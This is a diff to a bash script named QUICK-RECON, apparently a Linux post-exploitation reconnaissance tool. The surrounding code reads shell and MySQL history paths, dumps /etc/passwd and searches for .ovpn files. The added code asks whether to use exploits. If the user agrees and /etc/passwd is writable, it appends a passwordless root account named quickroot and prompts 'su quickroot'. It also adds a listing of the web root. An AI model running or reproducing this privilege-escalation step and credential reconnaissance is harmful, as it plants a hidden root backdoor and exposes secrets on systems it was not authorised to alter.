@@ -7,12 +7,24 @@
 
 bhist_PATH=~/.bash_history 
 msqlhist_PATH=~/.mysql_history
-
+run_exploits=false
 
 echo ----------------------------------------------------
 echo                     QUICK-RECON
 echo ----------------------------------------------------
 
+echo "Starting quickrecon. Do you want to have quickrecon try exploits (y/n)?"
+read usr_input
+
+if [ "$usr_input" == "y" ]; then
+	run_exploits=true
+	echo "Quickrecon will use exploits"
+else
+	run_exploits=false
+	echo "Quickrecon will NOT use exploits"
+fi
+
+printf "\n\n"
 printf "System Data...\n\n"
 
 printf "uname -a:\n"
@@ -69,7 +81,24 @@ if [ ! -f /etc/passwd ]; then
 else
 	printf "File found:\n"
 	cat /etc/passwd
+
+	if [ "$run_exploits" == true ]; then
+		printf "Run-Exploits is on... Checking permissions on /etc/passwd...\n"
+		ls -al /etc/passwd
+		if [ -w /etc/passwd ]; then
+			printf "\t/etc/passwd is writable by this user.\n"
+			printf "\tAttempting to inject passwordless root user with username quickroot...\n"
+			echo "quickroot::0:0:quickroot:/root:/bin/bash" >> /etc/passwd
+			printf "\tAttempt complete. Try: su quickroot\n"
+			printf "Press any key to continue...\n"
+			read usr_input
+
+		else
+			printf "\t/etc/passwd is NOT writable -- Can't inject root user.\n"
+		fi
+	fi
 fi
+
 printf "\n\n"
 
 
@@ -98,6 +127,10 @@ locate *.ovpn
 
 printf "\n\n"
 
+echo Listing files in /var/www/html...
+ls -al /var/www/html
+
+printf "\n\n"
 
 # -----------------------------------------------------------------------
 #
